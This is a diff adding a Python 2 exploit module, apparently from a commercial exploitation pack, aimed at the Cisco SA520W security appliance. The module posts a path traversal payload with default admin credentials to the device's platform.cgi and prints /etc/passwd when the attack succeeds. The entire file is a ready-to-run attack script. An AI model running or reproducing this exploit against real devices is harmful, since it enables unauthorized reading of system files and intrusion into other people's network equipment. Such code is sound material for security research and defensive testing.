@@ -1,0 +1,46 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_cisco_3'
+_vendor_ = 'cisco'
+_model_  = ['SA520W']
+_vuln_   = 'Path Traversal Vulnerability'
+_cve_    = ''
+_ref_    = 'https://packetstormsecurity.com/files/147693/Cisco-SA520W-Security-Appliance-Path-Traversal.html'
+_port_   = 443
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "https://%s/scgi-bin/platform.cgi" % host
+    headers = {u"Content-Type": u"application/x-www-form-urlencoded"}
+    data = "button.login.routerStatus=Log+In&Login.userAgent=Mozilla&SSLVPNUser.Password=admin&thispage=..//../../../../../../../../../etc%2Fpasswd\0&SSLVPNUser.UserName=admin"
+    response = requests.post(url, headers=headers, data=data, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  text = ''
+  for k,v in response.headers.iteritems():
+    text += '%s:%s\n'%(k,v)        
+  if "root:" in text:
+    print '[+] %s vulnerable' % host
+    print text
+  else:
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
